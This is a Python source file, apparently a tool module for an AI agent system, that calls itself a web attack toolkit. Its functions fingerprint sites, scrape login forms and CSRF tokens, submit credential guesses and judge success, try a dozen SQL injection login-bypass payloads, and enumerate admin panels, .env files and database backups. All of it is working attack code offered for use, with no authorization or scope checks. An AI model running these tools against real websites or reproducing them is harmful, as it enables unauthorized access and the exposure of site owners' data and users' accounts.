"""
Web attack toolkit for T's agent system.
Pure Python — no external tools required beyond httpx (already installed).
Covers: recon, login analysis, bypass techniques, brute force with intelligence.
"""

import asyncio
import httpx
import re
import json
from urllib.parse import urljoin, urlparse, urlencode
from core.logger import get_logger

log = get_logger("agents.web_attack")

_CLIENT_TIMEOUT = httpx.Timeout(15.0)
_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xhtml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}


# ─── Recon ─────────────────────────────────────────────────────────────────────

async def http_fingerprint(url: str, **_) -> str:
    """
    Full HTTP fingerprint of a URL.
    Returns: server, tech stack, security headers, cookies, redirects, response code.
    """
    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
            r = await c.get(url, headers=_HEADERS)

        lines = [
            f"URL:          {url}",
            f"Final URL:    {str(r.url)}",
            f"Status:       {r.status_code}",
            f"Server:       {r.headers.get('server', 'not disclosed')}",
            f"Powered-By:   {r.headers.get('x-powered-by', 'not disclosed')}",
            f"Content-Type: {r.headers.get('content-type', '?')}",
            "",
            "── Security Headers ──",
        ]
        sec_headers = [
            "x-frame-options", "x-xss-protection", "x-content-type-options",
            "strict-transport-security", "content-security-policy",
            "referrer-policy", "permissions-policy",
        ]
        for h in sec_headers:
            lines.append(f"  {h}: {r.headers.get(h, 'MISSING')}")

        lines.append("")
        lines.append("── Cookies ──")
        for name, val in r.cookies.items():
            lines.append(f"  {name}={val[:40]}...")

        lines.append("")
        lines.append("── Body Preview (500 chars) ──")
        lines.append(r.text[:500])

        return "\n".join(lines)
    except Exception as e:
        return f"[ERROR] {e}"


async def find_login_form(url: str, **_) -> str:
    """
    Fetch a page and extract all login-related forms.
    Returns form action, method, input fields, hidden fields (CSRF tokens etc).
    """
    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
            r = await c.get(url, headers=_HEADERS)

        body = r.text
        results = []

        # Find all forms
        forms = re.findall(r'<form[^>]*>.*?</form>', body, re.DOTALL | re.IGNORECASE)
        if not forms:
            # Try partial form (some pages don't close tags properly)
            forms = re.findall(r'<form[^>]*>.*?(?=<form|$)', body, re.DOTALL | re.IGNORECASE)

        for i, form in enumerate(forms):
            action  = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
            method  = re.search(r'method=["\']([^"\']*)["\']', form, re.IGNORECASE)
            inputs  = re.findall(r'<input[^>]*>', form, re.IGNORECASE)

            action_url = action.group(1) if action else ""
            if action_url and not action_url.startswith("http"):
                action_url = urljoin(str(r.url), action_url)

            fields = []
            hidden = []
            for inp in inputs:
                name  = re.search(r'name=["\']([^"\']*)["\']',  inp, re.IGNORECASE)
                type_ = re.search(r'type=["\']([^"\']*)["\']',  inp, re.IGNORECASE)
                val   = re.search(r'value=["\']([^"\']*)["\']', inp, re.IGNORECASE)
                if name:
                    field_info = f"  name={name.group(1)}  type={type_.group(1) if type_ else 'text'}"
                    if val:
                        field_info += f"  value={val.group(1)}"
                    if type_ and type_.group(1).lower() == "hidden":
                        hidden.append(field_info)
                    else:
                        fields.append(field_info)

            results.append(
                f"Form #{i+1}:\n"
                f"  action: {action_url or '(same page)'}\n"
                f"  method: {method.group(1).upper() if method else 'GET'}\n"
                f"  visible fields:\n" + "\n".join(f"    {f}" for f in fields) + "\n"
                f"  hidden fields (CSRF etc):\n" + "\n".join(f"    {h}" for h in hidden)
            )

        if not results:
            return f"No forms found at {url}.\nPage title: {_extract_title(body)}\nBody snippet:\n{body[:300]}"

        return f"Found {len(results)} form(s) at {url}:\n\n" + "\n\n".join(results)
    except Exception as e:
        return f"[ERROR] {e}"


async def probe_login(url: str, username_field: str, password_field: str,
                      username: str, password: str, extra_fields: str = "", **_) -> str:
    """
    Submit a single login attempt and return the full response analysis.
    extra_fields: JSON string of additional fields e.g. CSRF token: '{"_token": "abc123"}'
    Returns: status code, redirect location, response body snippet, success/fail indicators.
    """
    try:
        extra = json.loads(extra_fields) if extra_fields else {}
    except Exception:
        extra = {}

    data = {username_field: username, password_field: password, **extra}

    try:
        async with httpx.AsyncClient(
            timeout=_CLIENT_TIMEOUT,
            follow_redirects=False,
            cookies={},
        ) as c:
            # First get the page to grab cookies + CSRF if needed
            get_r = await c.get(url, headers=_HEADERS)
            cookies = dict(get_r.cookies)

            # Extract CSRF token from body if present and not already provided
            if not extra:
                csrf = _extract_csrf(get_r.text)
                if csrf:
                    data.update(csrf)

            r = await c.post(url, data=data, headers=_HEADERS, cookies=cookies)

        # Analyze response for success/fail indicators
        body     = r.text.lower()
        success  = any(w in body for w in [
            "dashboard", "welcome", "logout", "sign out", "profile",
            "admin panel", "logged in", "successfully", "account",
        ])
        failure  = any(w in body for w in [
            "invalid", "incorrect", "wrong", "failed", "error",
            "try again", "bad credentials", "unauthorized", "denied",
        ])
        redirect = r.headers.get("location", "")

        verdict = "✓ POSSIBLE SUCCESS" if success and not failure else (
                  "✗ FAILED"           if failure else
                  "→ REDIRECTED"       if redirect else
                  "? UNCLEAR")

        return (
            f"Attempt: {username} / {password}\n"
            f"Status:  {r.status_code}\n"
            f"Verdict: {verdict}\n"
            f"Redirect: {redirect or 'none'}\n"
            f"Body snippet: {r.text[:300]}\n"
            f"Data sent: {data}"
        )
    except Exception as e:
        return f"[ERROR] {e}"


async def sql_injection_login(url: str, username_field: str, password_field: str, **_) -> str:
    """
    Test a login form for SQL injection bypass.
    Tries classic payloads: ' OR '1'='1, admin'--, etc.
    Returns which payload (if any) succeeded.
    """
    payloads = [
        ("' OR '1'='1",       "' OR '1'='1"),
        ("admin'--",          "anything"),
        ("admin' #",          "anything"),
        ("' OR 1=1--",        "x"),
        ("admin'/*",          "x"),
        ("') OR ('1'='1",     "x"),
        ("' OR 'x'='x",       "x"),
        ("1' OR '1' = '1'--", "x"),
        ("admin' OR '1'='1'--","x"),
        ("' OR 1=1#",         "x"),
        ("\" OR \"1\"=\"1",   "x"),
        ("admin\"--",         "x"),
    ]

    results = []
    try:
        async with httpx.AsyncClient(
            timeout=_CLIENT_TIMEOUT,
            follow_redirects=False,
        ) as c:
            get_r = await c.get(url, headers=_HEADERS)
            base_cookies = dict(get_r.cookies)
            base_csrf    = _extract_csrf(get_r.text)

            for uname, passwd in payloads:
                data = {username_field: uname, password_field: passwd}
                if base_csrf:
                    data.update(base_csrf)

                try:
                    r = await c.post(url, data=data, headers=_HEADERS, cookies=base_cookies)
                    body     = r.text.lower()
                    success  = any(w in body for w in [
                        "dashboard", "welcome", "logout", "profile",
                        "admin panel", "logged in", "account",
                    ])
                    failure  = any(w in body for w in [
                        "invalid", "incorrect", "wrong", "failed",
                        "error", "try again", "unauthorized",
                    ])
                    redirect = r.headers.get("location", "")
                    status   = r.status_code

                    verdict = "✓ BYPASS" if (success or (status in [301,302] and "login" not in redirect.lower())) and not failure else "✗"
                    results.append(f"{verdict}  [{status}]  user={uname!r}  pass={passwd!r}  redirect={redirect or 'none'}")

                    if verdict.startswith("✓"):
                        results.append(f"\n[!] SUCCESSFUL BYPASS with payload: username={uname!r}")
                        break

                    await asyncio.sleep(0.3)  # avoid rate limiting
                except Exception as e:
                    results.append(f"[ERR] {uname!r}: {e}")

    except Exception as e:
        return f"[ERROR] {e}"

    return "SQL Injection Login Bypass Results:\n" + "\n".join(results)


async def fetch_page_with_cookies(url: str, cookies: str = "", **_) -> str:
    """
    Fetch a page with specific cookies (e.g. after successful login).
    cookies: JSON string e.g. '{"session": "abc123"}'
    """
    try:
        jar = json.loads(cookies) if cookies else {}
    except Exception:
        jar = {}
    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
            r = await c.get(url, headers=_HEADERS, cookies=jar)
        return f"Status: {r.status_code}\nURL: {r.url}\nBody:\n{r.text[:1000]}"
    except Exception as e:
        return f"[ERROR] {e}"


async def directory_enum(base_url: str, wordlist: str = "common", **_) -> str:
    """
    Enumerate common paths on a web server.
    wordlist: 'common' (default) or 'admin' (admin-focused paths)
    """
    common_paths = [
        "admin", "admin/", "administrator", "login", "wp-admin", "phpmyadmin",
        "dashboard", "panel", "cpanel", "manager", "management",
        "admin.php", "login.php", "admin/login", "admin/login.php",
        "user/login", "auth/login", "account/login", "signin",
        "wp-login.php", "xmlrpc.php", "wp-json/wp/v2/users",
        ".env", "config.php", "configuration.php", "config.js",
        "backup", "backup.zip", "backup.sql", "db.sql",
        "robots.txt", "sitemap.xml", ".htaccess",
        "api", "api/v1", "api/v2", "swagger", "swagger-ui",
        "console", "shell", "cmd", "exec",
    ]
    admin_paths = [
        "admin", "admin/", "admin/index.php", "admin/login.php",
        "administrator/", "administrator/index.php",
        "admincp/", "adminpanel/", "admin_area/",
        "moderator/", "webadmin/", "adminarea/",
        "bb-admin/", "adminLogin/", "admin_login/",
        "cpanel/", "cPanel/", "panel/",
    ]
    paths = admin_paths if wordlist == "admin" else common_paths

    base = base_url.rstrip("/")
    found = []
    errors = []

    async with httpx.AsyncClient(timeout=httpx.Timeout(8.0), follow_redirects=False) as c:
        tasks = [c.get(f"{base}/{p}", headers=_HEADERS) for p in paths]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

    for path, resp in zip(paths, responses):
        if isinstance(resp, Exception):
            continue
        code = resp.status_code
        if code in [200, 301, 302, 403]:
            loc = resp.headers.get("location", "")
            found.append(f"  [{code}] /{path}  {('→ ' + loc) if loc else ''}")

    if not found:
        return f"No interesting paths found on {base_url} (checked {len(paths)} paths)"
    return f"Found {len(found)} paths on {base_url}:\n" + "\n".join(found)


# ─── Helpers ───────────────────────────────────────────────────────────────────

def _extract_csrf(html: str) -> dict:
    """Extract CSRF token from HTML."""
    patterns = [
        r'<input[^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken)["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']{20,})["\'][^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken)["\']',
        r'csrf[_-]?token["\']?\s*[=:]\s*["\']([^"\']{10,})["\']',
        r'"csrf":"([^"]+)"',
        r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            groups = m.groups()
            if len(groups) >= 2:
                field_name = groups[0] if groups[0] in [
                    "_token", "csrf_token", "csrfmiddlewaretoken",
                    "authenticity_token", "__RequestVerificationToken"
                ] else groups[1]
                token = groups[1] if groups[0] == field_name else groups[0]
                return {field_name: token}
            else:
                return {"csrf_token": groups[0]}
    return {}


def _extract_title(html: str) -> str:
    m = re.search(r'<title>([^<]+)</title>', html, re.IGNORECASE)
    return m.group(1).strip() if m else "no title"
